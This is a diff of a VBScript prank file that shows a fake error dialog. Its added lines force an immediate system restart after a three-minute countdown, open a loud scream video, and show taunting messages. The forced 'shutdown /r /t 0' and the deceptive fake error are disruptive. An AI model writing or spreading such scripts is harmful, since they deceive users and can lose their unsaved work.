@@ -146,7 +146,7 @@ x=msgbox("This Program Cant Start On Your Computer Because MSVCR120.DLL Is  Miss
 ' Save as ErrorMsg.vbs and double-click to run
 
 Dim choice
-choice = MsgBox("", vbAbortRetryIgnore + vbCritical + vbMsgBoxHelpButton, "Erro")
+choice = MsgBox("", vbAbortRetryIgnore + vbCritical + vbMsgBoxHelpButton, "Error")
 
 Select Case choice
     Case vbAbort
@@ -156,13 +156,26 @@ Select Case choice
     Case vbIgnore
         MsgBox "Budgie Has Been Sucesfully lauched."
 shell.SendKeys "ur DEAD mf"
+Set objShell = CreateObject("Wscript.Shell")
+
+' Wait for 180 seconds (3 minutes)
+MsgBox "Your system will be restarted in 180 seconds."
+Wscript.Sleep 180000
+
+' Restart the computer
+objShell.Run "shutdown /r /t 0"
+MsgBox "ENJOY YOUR FRIED CHICKEN BOZO"
+shell.SendKeys "F11n e"
     Case vbMsgBoxHelpButton
         MsgBox "DAMIR78.dll has been executed"
+Urlw = "https://www.youtube.com/shorts/sBcrrswGtMU#LOUD_ASS_SCREAM" 
+set wshhl = WScript.CreateObject("wscript.shell")
+wshhl.Run(URLw)
+wellisdrining=inputbox("DAm is GG     hahah4hhHAAAHHG44Aha3jh3amj4645çkikrfgjjjjjjjjjjjjc","DAMIR78.dll","input")
 End Select
 
 
 End If
-
 
 
 
